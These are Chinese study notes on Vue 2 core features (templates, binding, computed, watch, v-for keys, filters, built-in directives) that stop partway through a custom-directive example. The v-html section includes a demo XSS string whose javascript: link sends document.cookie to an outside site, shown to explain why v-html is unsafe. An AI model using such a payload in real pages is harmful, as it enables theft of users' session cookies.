# 1.Vue核心

官网：

vue2：[Vue.js (vuejs.org)](https://v2.cn.vuejs.org/)

vue3：[Vue.js - 渐进式 JavaScript 框架 | Vue.js (vuejs.org)](https://cn.vuejs.org/)

### 简介

• 动态构建用户界面的渐进式JavaScript框架

### **Vue的特点**

1. 遵循MVVM模式
2. 编码简洁，体积小，运行效率高，适合移动/PC端开发
3. 它本身只关注UI，可以引入其它第三方库开发项目

### **与其他JS框架的关联**

1. 借鉴 Angular 的和技术模板数据绑定
2. 借鉴 React 的和技术组件化虚拟DOM

### **Vue周边库**

- vue-cli：vue脚手架
- vue-resource
- axios
- vue-router：路由
- vuex：状态管理
- element-ui：基于vue的UI组件库（PC端）

### ****初识Vue****

```jsx
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="js/vue.js"></script>
    
</head>
<body>
    <div id="root">
        <h1>11133222223233555552{{name}}</h1>
    </div>
    
    <script type="text/javascript">
        Vue.config.productionTip=false
        new Vue({
            el:'#root',
            data:{
                name:'dadsadsa'
            }
        })
    </script>
</body>
</html>
```

**注意：**

1. 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象
2. root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法
3. root容器里的代码被称为Vue模板
4. **Vue实例与容器是的一一对应**
5. 真实开发中只有一个Vue实例，并且会配合着组件一起使用
6. `{{xxx}}`中的xxx要写**js表达式**，且xxx可以自动读取到data中的所有属性js表达式
7. 一旦data中的数据发生变化，那么模板中用到该数据的地方也会自动更新

### 模板语法—插值语法{{}}&指令语法v-??? & ****数据绑定v-bind: / :****

**模板语法总结：**

Vue模板语法包括两大类：

1. **插值**语法：
- 功能：用于解析**标签体**内容
- 写法：`{{xxx}}`，xxx是js表达式，且可以直接读取到data中的所有区域
1. **指令**语法：
- 功能：用于解析**标签（包括：标签属性、标签体内容、绑定事件…）**
- 举例：`<a v-bind:href="xxx">`或简写为`<a :href="xxx">`，xxx同样要写js表达式，且可以直接读取到data中的所有属性
- 备注：Vue中有很多的指令，且形式都是`v-???`，此处我们只是拿`v-bind`举个例子

**数据绑定总结：**

- Vue中有2种数据绑定的方式：
    1. 单向绑定（`v-bind`）：数据只能从data流向页面
    2. 双向绑定（`v-model`）：数据不仅能从data流向页面，还可以从页面流向data
- 备注：
    1. 双向绑定一般都应用在上（如：`<input>`、`<select>`、`<textarea>`等）表单类元素
    2. `v-model:value`可以简写为`v-model`，因为`v-model`默认收集的就是value值

```jsx
<body>
    <div id="box">
        <h1>111{{name.toUpperCase()}}</h1>
        <a v-bind:href="name"></a>
        <a :href="name"></a>
        a:<input type="text" name="" id="" v-model:value="name"><br>
        b:<input type="text" name="" id="" v-model="name">
    </div>
    <script type="text/javascript">
        Vue.config.productionTip=false
        new Vue({
            el:'#box',
            data:{
                name:'dadsadsa'
            }
        })
    </script>
</body>
```

### ****el vue.$mount 与 data的两种写法****

**总结：**

el有2种写法：

1. 创建Vue实例对象的时候配置el属性
2. 先创建Vue实例，随后再通过`vm.$mount('#root')`指定el的值

```jsx
//1.
const Vue=new Vue({
el:'#root'
})
//2.
Vue.$mount('#root')
```

data有2种写法：

1. 对象式
2. 函数式
- 如何选择：目前哪种写法都可以，以后学到组件时，data必须使用函数，否则会报错

```jsx
//1.对象式
new Vue({})
//2.函数式
data:function(){}
or
data(){}
```

- **由Vue管理的函数，一定不要写箭头函数，否则this就不再是Vue实例了**

### ****MVVM模型****

- MVVM模型：
    - M：模型（Model），data中的数据
    - V：视图（View），模板代码
    - VM：视图模型（ViewModel），Vue实例
        
        ![Untitled](1%20Vue%E6%A0%B8%E5%BF%83%20dff57a8d625749b2a25464ed854d83b1/Untitled.png)
        

**总结：**

- data中所有的属性，最后都出现在了vm身上
- vm身上所有的属性 及 Vue原型身上所有的属性，在Vue模板中`{{}}`or`:href`都可以直接使用,
    
    ![Untitled](1%20Vue%E6%A0%B8%E5%BF%83%20dff57a8d625749b2a25464ed854d83b1/Untitled%201.png)
    

### Object.defineProperty()

```jsx
<script>
        let number=18
        let person={
            name:'张三',
            sex:'男'
        }
        Object.defineProperty(person,'age',{
            value:18, //age 默认值 但是是不可以枚举（不能被遍历）、不能被修改、不能被删除的
            //可以通过enumrable、writable、configurable ：true 让该person的属性能美剧、修改、删除
            enumerable:true,
            //让age是动态获取number的值
            get(){
                return number
            },
            //当有人修改age时，setter就会被调用
            set(value){
                number=value

            }
        })
    </script>
```

1. 将对象属性绑定到另一个对象上
2.  数据劫持-监听对象数据变化实现数据变化自动更新界面

### ****Vue中的数据代理****

![Untitled](1%20Vue%E6%A0%B8%E5%BF%83%20dff57a8d625749b2a25464ed854d83b1/Untitled%202.png)

**总结：**

1. Vue中的数据代理通过**vm对象来代理data对象中属性**的操作（读/写）
2. Vue中数据代理的好处：更加方便的操作data中的数据
3. 基本原理：
    - 通过`object.defineProperty()`把data对象中所有属性添加到vm上。
    - 为每一个添加到vm上的属性，都指定一个getter/setter。
    - 在getter/setter内部去操作（读/写）data中对应的属性。

### ****事件处理—****`v-on:xxx | @click=”myDefineFun($event,66)”`

```jsx
<body>
    <div class="root">
        <button v-on:click="showInfo1">11</button>
        <button @click="showInfo2($event,66)">22</button>
    </div>
    
    <script>
        Vue.config.productionTip=false
        const vm=new Vue({
            el:'.root',        
            data:{
                name:'tam'
            },
            methods:{
                showInfo1(){
                    console.log('111');
                },
                showInfo2(event,number){
                    console.log(event.target.innerText);
                }
            }
         })
    </script>
</body>
```

**总结：**

1. 使用`v-on:xxx`或`@xxx`绑定事件，其中xxx是事件名(例如click）
2. 事件的回调需要**配置在methods对象**中，最终会在vm上
3. **methods中配置的函数，不要用箭头函数！否则this就不是vm了**
4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象
5. `@click="demo"`和`@click="demo($event)"`效果一致，但后者可以传参

### ****键盘事件 @keyup.enter****

```jsx
<body>
    <div id="root">
        <h1>{{name}}</h1>
        <input type="text" name="" id="" @keyup.enter="showInfo">
    </div>
    
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                name:'tam'
            },
            methods:{
                showInfo(e){
                    console.log(e.target.value)
                }
            }
        })
    </script>
</body>
```

键盘上的每个按键都有自己的名称和编码(keycode 已经逐渐弃用)，例如：Enter（13）。而Vue还对一些常用按键起了别名方便使用

Vue中常用的按键别名：

- 回车：enter  `@keyup.enter="showInfo"`
- 删除：delete (捕获“删除”和“退格”键)
- 退出：esc
- 空格：space
- 换行：tab (特殊，必须配合keydown去使用)
- 上：up
- 下：down
- 左：left
- 右：right

**注意：**

1. 系统修饰键（用法特殊）：ctrl、alt、shift、meta
    - 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发
    - 配合keydown使用：正常触发事件
    - 例如 `@keyup.ctrl.y=””`
2. 可以使用keyCode去指定具体的按键，比如：`@keydown.13="showInfo"`，但不推荐这样使用
3. `Vue.config.keyCodes.自定义键名 = 键码`，可以自定义按键别名，

### ****计算属性**** computed

```jsx
<body>
    <div id="root">
        firstName<input type="text" v-model="firstName"><br>
        lastName<input type="text" v-model="lastName" ><br>
        姓名<span>{{fullName}}</span>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                firstName:'tan',
                lastName:'wenzaho'
            },
            computed:{

                fullName:{
                    get(){
                        return this.firstName+'-'+this.lastName
                    },
                    set(value){
                        const arr=value.split('-')
                        fullName=arr[0]+'-'+arr[1]
                    }
                    
                }
									//简写 相对于在vm中放了一个fullName的属性，该属性是该函数的返回值
									fullName(){...}

            }
        })
    </script>
</body>
```

计算属性：

- 定义：要用的属性不存在，需要通过**已有属性(必须是data里的属性)**计算得来。
- 原理：底层借助了Objcet.defineProperty()方法提供的getter和setter。
- get函数什么时候执行？
    1. 初次读取时会执行一次
    2. 当依赖的数据发生改变时会被再次调用
- 优势：与methods实现相比，**内部有缓存机制（复用）**，效率更高，调试方便
- 备注：
    - **计算属性最终会出现在vm上，直接读取使用即可**
    - 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变
    - 如果计算属性确定不考虑修改(没有setter)，可以使用计算属性的**简写形式(** 相对于在vm中放了一个fullName的属性，该属性是该简写函数的返回值**)**

### ****监视属性****  watch:

```jsx
<body>
    <div id="root">
        <h2>今天天气好{{info}}!</h2>
        <button @click="changeWeather">点击切换天气</button>
    </div>

    <script>
        Vue.config.productionTip = false 

        new Vue({
            el:'#root', 
            data:{ 
                isHot:true,
            },
            computed:{
                info(){
                    return this.isHot ? '炎热' : '凉爽' 
                }
            },
            methods:{
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
            watch:{
                isHot:{
                    immediate:true, //初始化时让handler调用一下
                    //handler什么时候调用？当isHot发生改变时
                    handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
                }
            }
        })
    </script>
</body>

```

监视属性watch：

1. **当被监视的属性变化时，回调函数自动调用**，进行相关操作
2. handler函数能提供,newValue,oldValue值
3. **监视的属性，才能进行监视必须存在**
    1. 监视有两种写法：
        1. 创建Vue时传入watch配置
        2. 通过`vm.$watch`监视 
        3. 加入immediate可以让它立即执行一次 没有发生变化也先执行一次
            
            ```jsx
            vm.$watch('isHot',{
            	immediate:true,
            	handler(newValue,oldValue){
            		console.log('isHot被修改了',newValue,oldValue)
            	}
            })
            ```
            

### ****深度监视**** `deep:true`

- 深度监视：
    1. Vue中的watch默认不监测对象内部值的改变（一层）
    2. 在watch中配置`deep:true`可以监测对象内部值的改变（多层）
- 备注：
    1. **Vue自身可以监测对象内部值的改变，但Vue提供的watch**
        
        **默认不可以**
        
    2. 使用watch时根据监视数据的具体结构，决定是否采用深度监视

```jsx
 watch:{
deep:true,
}
```

****监视属性简写****

如果监视属性除了handler没有其他配置项的话，可以进行简写。

```jsx
//正常写法
    vm.$watch('isHot',{
        handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
        }
    })
    //简写
    vm.$watch('isHot',function(newValue,oldValue){
        console.log('isHot被修改了',newValue,oldValue,this)
    })
```

### ****监听属性 VS 计算属性****

使用计算属性：

```jsx
new Vue({
    el:'#root', 
    data:{ 
        firstName:'张',
        lastName:'三'
    },
    computed:{
    	fullName(){
		    return this.firstName + '-' + this.lastName
    	}
    }
})
```

使用监听属性：

```jsx
new Vue({
	el:'#root',
	data:{
		firstName:'张',
		lastName:'三',
		fullName:'张-三'
	},
	watch:{
		firstName(val){
			setTimeout(()=>{
				this.fullName = val + '-' + this.lastName
			},1000);
		},
		lastName(val){
			this.fullName = this.firstName + '-' + val
		}
	}
})
```

**总结：**

- computed和watch之间的区别：
    - computed能完成的功能，watch都可以完成
    - watch能完成的功能，computed不一定能完成，例如：**watch可以进行异步操作**
- 两个重要的小原则：
    1. **所有被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象**
    2. **所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。**

### ****绑定样式****`:class="xxx" :style=“”`

```jsx
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        .basic{
            width: 100px;
            height: 100px;
            border: #2384b1 1px solid;
        }
        .red{
            background-color: #d84040;
        }
        .blue{
            background-color: #2384b1;
            border: #229fc2 3px solid;
        }
        .green{
            background-color: #2cbd80;
        }
				.color{
						background-color: red;
				}
    </style>
    <script src="js/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
    <div class="basic" :class="color" @mouseover="changeColor"></div> <br><br>
     <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
    <div class="basic" :class="colorArr"></div><br><br>
     <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
     <div class="basic" :class="colorObj"></div> <br/><br/>
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                color:'color',
                colorArr:['red','green','blue'],
                colorObj:{
                    red:false,
                    green:false,
                    blue:false
                }
            },
            methods: {
                changeColor(){
                    const arr=['red','green','blue']
                    let index=Math.floor(Math.random()*3)
                    this.color=arr[index]

                }
            },
        })
    </script>
</body>
</html>
```

1. class样式：
    - 写法：`:class="xxx"`，xxx可以是字符串、对象、数组
    - 字符串写法适用于：类名不确定，要动态获取
    - 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定
    - 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用
2. style样式：
    - `:style="{fontSize: xxx}"`   其中xxx是动态值       =**‘’ ’’里必须是对象**
    - `:style="[a,b]"`其中a、b是样式对象
        
        ```jsx
        <!-- 绑定style样式--对象写法 -->
            <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
        
            <!-- 绑定style样式--数组写法 -->
            <div class="basic" :style="styleArr">{{name}}</div>
        
        <script type="text/javascript">
        	Vue.config.productionTip = false
        		
            const vm = new Vue({
                el:'#root',
                data:{
                    name:'尚硅谷',
                    mood:'normal',
                    classArr:['atguigu1','atguigu2','atguigu3'],
                    classObj:{
                        atguigu1:false,
                        atguigu2:false,
                    },
                    styleObj:{
                        fontSize: '40px',
                        color:'red',
                    },
                    styleObj2:{
                        backgroundColor:'orange'
                    },
                    styleArr:[
                        {
                            fontSize: '40px',
                            color:'blue',
                        },
                        {
                            backgroundColor:'gray'
                        }
                    ]
                },
                methods: {
                    changeMood(){
                        const arr = ['happy','sad','normal']
                        const index = Math.floor(Math.random()*3)
                        this.mood = arr[index]
                    }
                },
            })
        </script>
        ```
        

### ****条件渲染— v-if/else-if/else  v-show****

**总结：**

```
<body>
    <div id="root">
        <button @click="n++">click</button>
        <h2 v-if="n===1">222</h2>
        <h2 v-else-if="n===2">333</h2>
        <h2 v-else="">444</h2>
        <h2 v-show="true">11111</h2>
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                n:0,
            }
        })
    </script>
</body>
```

1. v-if：
    - 写法：
        1. `v-if="表达式"`
        2. `v-else-if="表达式"`
        3. `v-else`
    - 适用于：切换频率较低的场景
    - 特点：不展示的DOM元素直接被移除
    
    • 注意：`v-if`可以和`v-else-if`、`v-else`一起使用，但要求结构不能被打断
    
2. v-show：
    - 写法：`v-show="表达式"`
    - 适用于：切换频率较高的场景
    - 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

使用`v-if`的时候，元素可能无法获取到，而使用`v-show`一定可以获取到

### ****列表渲染— v-for****

`v-for`指令：

1. 用于展示列表数据
2. 语法：`<li v-for="(item, index) in xxx" :key="yyy">`，其中key可以是index，也可以是遍历对象的唯一标识
3. 可遍历：数组、对象（value，key）、字符串（用的少）、指定次数（用的少）

```html
<body>
    <div id="root">
        <!-- 遍历数组 -->
        <ul>
            <li v-for="p in Persons" :key="p.id">
                {{p.id}}--{{p.name}}
            </li>
        </ul>
        
        <!-- 遍历对象 -->
        <ul>
            <li v-for="(value,key) in car" :key="key">
                {{value}}--{{index}}
            </li>
        </ul>

        <!-- 遍历字符串 -->
        <ul>
            <li v-for="(char,index) in str" :key="index">
                {{char}}--{{index}}
            </li>
        </ul>

        <!-- 遍历对象 -->
        <ul>
            <li v-for="(number,index) in 5" :key="index">
                {{number}}--{{index}}
            </li>
        </ul>

    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                Persons:[
                    {id:'001',name:'张三',age:18},
					{id:'002',name:'李四',age:19},
					{id:'003',name:'王五',age:20}
                ],
                car:{
                    name:'BYD',
                    type:'song',
                    price:'9.9'
                },
                str:'hello',
            }
        })
    </script>
</body>
```

### ****key的作用与原理—****虚拟DOM中对象的标识

```jsx
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>key的原理</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>人员列表</h2>
			<button @click.once="add">添加老刘</button>
			<ul>
				<li v-for="(p,index) in persons" :key="index">
					{{p.name}} - {{p.age}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					]
				},
				methods: {
					add(){
						const p = {id:'004',name:'老刘',age:40}
						this.persons.unshift(p)
					}
				},
			})
		</script>
</html>
```

**原理：**

![Untitled](1%20Vue%E6%A0%B8%E5%BF%83%20dff57a8d625749b2a25464ed854d83b1/Untitled%203.png)

![Untitled](1%20Vue%E6%A0%B8%E5%BF%83%20dff57a8d625749b2a25464ed854d83b1/Untitled%204.png)

**面试题**：react、vue中的key有什么作用？（key的内部原理）

1. 虚拟DOM中key的作用：key是虚拟DOM中对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
2. 对比规则：
- 旧虚拟DOM中找到了与新虚拟DOM相同的key：
    1. 若虚拟DOM中内容没变, 直接使用之前的真实DOM
    2. 若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM
- 若虚拟DOM中内容没变, 直接使用之前的真实DOM
1. 用index作为key可能会引发的问题：
    1. 若对数据进行逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低
    2. **若结构中还包含输入类的DOM：会产生错误DOM更新 ==> 界面有问题**
2. 开发中如何选择key?
    1. 最好**使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值**
    2. **如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表，使用index作为key是没有问题的**

### ****列表过滤****

```html
<body>
    <div id="root">
        <input type="text" v-model="keyWord" placeholder="input keyWord!">
        <ul>
            <li v-for="p in filPerson" :key="p.id">
                {{p.name}}--{{p.age}}--{{p.sex}}
            </li>
        </ul>

    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                keyWord:'',
                persons:[
                {id:'001',name:'马冬梅',age:19,sex:'女'},
                {id:'002',name:'周冬雨',age:20,sex:'女'},
                {id:'003',name:'周杰伦',age:21,sex:'男'},
                {id:'004',name:'温兆伦',age:22,sex:'男'}
                ],
                
                
            },
            computed:{
                filPerson(){
                    return this.persons.filter(p=>p.name.indexOf(this.keyWord)!==-1)
                }

            },
           
        })
    </script>
</body>
```

### 列表排序

```html
<body>
    <div id="root">
        <input type="text" v-model="keyWord" placeholder="input keyWord!">
        <button @click="sortType = 1">年龄升序</button>
		<button @click="sortType = 2">年龄降序</button>
		<button @click="sortType = 0">原顺序</button>
        <ul>
            <li v-for="p in filPerson" :key="p.id">
                {{p.name}}--{{p.age}}--{{p.sex}}
            </li>
        </ul>

    </div>
    <script>
        new Vue({
            el:'#root',
            
            data:{
                
                keyWord:'',
                sortType:0, //0原序 1升序 2降序
                persons:[
                {id:'001',name:'马冬梅',age:19,sex:'女'},
                {id:'002',name:'周冬雨',age:20,sex:'女'},
                {id:'003',name:'周杰伦',age:21,sex:'男'},
                {id:'004',name:'温兆伦',age:22,sex:'男'}
                ],
                
                
            },
            computed:{
                filPerson(){
                    let arr=this.persons.filter(p=>p.name.indexOf(this.keyWord)!==-1)
                    if(this.sortType){
                        arr.sort((p1,p2)=>{
                            return this.sortType===1?p1.age-p2.age:p2.age-p1.age
                        })
                    } 
                    return arr
                }

            },
           
        })
    </script>
</body>
```

### ****Vue数据监视 & $set() 数组和对象修改数据方法**

```jsx
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue数据监视</title>
		<style>
			button{
				margin-top: 10px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h1>学生信息</h1>
			<button @click="student.age++">年龄+1岁</button><br/>
			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button><br/>
			<button @click="addHobby">添加一个爱好</button> <br/>
			<button @click="updateHobby">修改第一个爱好为：开车</button><br/>
			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
			<h3>姓名：{{student.name}}</h3>
			<h3>年龄：{{student.age}}</h3>
			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
			<h3>爱好：</h3>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h3>朋友们：</h3>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				student:{
					name:'tom',
					age:18,
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					//Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				},
				addFriend(){
					this.student.friends.unshift({name:'jack',age:70})
				},
				updateFirstFriendName(){
					this.student.friends[0].name = '张三'
				},
				addHobby(){
					this.student.hobby.push('学习')
				},
				updateHobby(){
					this.student.hobby.splice(0,1,'开车')
				},
				removeSmoke(){
					this.student.hobby = this.student.hobby.filter((h)=>{
						return h !== '抽烟'
					})
				}
			}
		})
	</script>
</html>
```

**总结：**

Vue监视数据的原理：

1. vue会监视data中所有层次的数据
2. 如何监测对象中的数据？
    
    通过setter实现监视，且要在`new Vue`时就传入要监测的数据
    
    1. 对象中后追加的属性，Vue默认不做响应式处理
    2. 如需给后添加的属性做响应式，请使用如下API：
        - `vm.$set(target,propertyName/index,value)`
        - `Vue.set(target,propertyName/index,value)`
3. 如何监测数组中的数据？
    
    通过包裹数组更新元素的方法实现，本质就是做了两件事：
    
    1. 调用原生对应的方法对数组进行更新
    2. 重新解析模板，进而更新页面
4. 在Vue修改数组中的某个元素一定要用如下方法：
    1. 使用这些API：`push()`、`pop()`、`shift()`、`unshift()`、`splice()`、`sort()`、`reverse()`
    2. `Vue.set()` 或 `vm.$set()` `vm.$delete()`  **可以修改对象和数组**

**特别注意：`Vue.set()` 和 `vm.$set()` 不能给vm 或 vm的根数据对象（data等） 添加属性,只能在其里面包含的对象或数组上添加**

**(自己总结）vue通过给数组对象Array包装 让数组通过以上方法修改数组时 同时解析模板 所以说通过以上以外的方法修改数组的内容 不会重新解析模板**

### ****收集表单数据****

收集表单数据：

- 若：`<input type="text"/>`，则`v-model`收集的是value值，用户输入的内容就是value值
- 若：`<input type="radio"/>`，则`v-model`收集的是value值，且要给标签配置value属性
- 若：`<input type="checkbox"/>`
    - 配置了value属性：
        - `v-model`的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
        - `v-model`的初始值是**数组**，那么收集的就是value组成的数组
    - 没有配置value属性，那么收集的是checked属性（勾选 or 未勾选，是布尔值）

`v-model`的三个修饰符：

1. lazy：失去焦点后再收集数据 （**textarea 等输入完再收集数据）**
2. number：输入字符串转为有效的数字 
3. trim：输入首尾空格过滤

### day.js -处理时间的库

[dayjs/README.zh-CN.md at dev · iamkun/dayjs (github.com)](https://github.com/iamkun/dayjs/blob/dev/docs/zh-cn/README.zh-CN.md)

Moment.js 的 **2kB** 轻量化方案

```jsx
dayjs('2018-08-08') // parse

dayjs().format('{YYYY} MM-DDTHH:mm:ss SSS [Z] A') // display

dayjs().set('month', 3).month() // get & set

dayjs().add(1, 'year') // manipulate

dayjs().isBefore(dayjs()) // query
```

```html
<script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    </head>
	<body>
		<div id="root">
			<h2>时间</h2>
            <h3>当前时间戳：{{time}}</h3>
            <h3>转换后时间：{{timeFormater}}</h3>
            <h3>转换后时间：{{timeFormater1()}}</h3>
     
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		// //全局过滤器
		// Vue.filter('mySlice',function(value){
		// 	return value.slice(0,11)
		// })
		new Vue({
            el:'#root',
            data:{
                time:1626750147900,
            },
            computed:{
                timeFormater(){
                    return dayjs().format('YYYY年MM月DD日 HH时:mm分:ss秒')
                }
            },
            methods: {
                timeFormater1(){
                    return dayjs().format('YYYY年MM月DD日 HH时:mm分:ss秒')
                }
            },
		
        })
	</script>
</html>
```

### ****过滤器**** filters:{} Vue.filter()

```jsx
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>时间</h2>
            <h3>当前时间戳：{{time}}</h3>
            <h3>转换后时间：{{time | timeFormater()}}</h3>
			<h3>转换后时间：{{time | timeFormater('YYYY-MM-DD HH:mm:ss')}}</h3>
			<h3>截取年月日：{{time | timeFormater() | mySlice}}</h3>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,11)
		})
		new Vue({
            el:'#root',
            data:{
                time:1626750147900,
            },
			//局部过滤器
            filters:{
                timeFormater(value, str="YYYY年MM月DD日 HH:mm:ss"){
                    return dayjs(value).format(str)
                }
            }
        })
	</script>
</html>
```

过滤器：

- 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
- 语法：
    1. 注册过滤器：**全局**：`Vue.filter(name,callback)` 或 **局部**`new Vue{filters:{}}`
    2. 使用过滤器：管道符 | `{{ xxx | 过滤器名}}` 或 `v-bind:属性 = "xxx | 过滤器名"` `v-model`好像不可以
- 备注：
    1. 过滤器可以接收额外参数，多个过滤器也可以串联
    2. 并**没有改变原本的数据，而是产生新的对应的数据**

### ****内置指令 v-text/html/cloak/once****

1.  ****v-text指令****

```jsx
<body>
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-text="name"></div>
			<div v-text="str"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false 
		
		new Vue({
			el:'#root',
			data:{
				name:'JOJO',
				str:'<h3>你好啊！</h3>'
			}
		})
	</script>

```

- 之前学过的指令：
    - `v-show`：条件渲染 (动态控制节点是否展示)
    - `v-for`：遍历数组 / 对象 / 字符串
    - `v-on`：绑定事件监听，可简写为`@`
    - `v-if`：条件渲染（动态控制节点是否存存在）
    - `v-else`：条件渲染（动态控制节点是否存存在）
    - `v-model`：双向数据绑定
    - `v-bind`：单向绑定解析表达式，可简写为`:`

`v-text`指令：

1. 作用：向其所在的节点中渲染文本内容
2. 与插值语法的区别：`v-text`会替换掉节点中的内容，`{{xx}}`则不会。

1. ****v-html指令****

```jsx
<body>
		<div id="root">
			<div>Hello，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'JOJO',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
```

**总结：**

`v-html`指令：

1. 作用：向指定节点中渲染包含html结构的内容
2. 与插值语法的区别：
    1. `v-html`会替换掉节点中所有的内容，`{{xx}}`则不会
    2.  `v-html`可以识别html结构
3. 严重注意：`v-html`有安全性问题！！！
    1. 在网站上动态渲染任意HTML是非常危险的，容易导致**XSS攻击（诱导用户把自己的cookie提交到钓鱼网站上）**
    2. 一定要在可信的内容上使用`v-html`，永远不要用在用户提交的内容上！！！
    

3. v-cloak

`v-cloak`指令（没有值）：

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉`v-cloak`属性
2. 使用css配合`v-cloak`可以解决网速慢时页面展示出`{{xxx}}`的问题

```jsx
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			[v-cloak]{
				display:none;
			}
		</style>
	</head>
	<body>
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
		<script type="text/javascript" src="../js/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

1. v-once

`v-once`指令：

1. `v-once`所在节点在初次动态渲染后，就视为静态内容了
2. 以后数据的改变不会引起`v-once`所在结构的更新，可以用于优化性能

```html
<body>
    <div id="root">
        <div >{{a}}</div>
        <div  v-once>{{a}}</div>
        <button @click="a++" >a++</button>
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                a:1,
            }
        })
    </script>
</body>
```

1. ****v-pre指令****

`v-pre`指令：

1. 跳过其所在节点的编译过程。
2. 可利用它跳过：没有使用指令语法、**没有使用插值语法的节点，会加快编译**

```jsx
<body>
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>
```

### ****自定义指令**** `directives:{} Vue.directive()`

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
    <!-- 
		需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
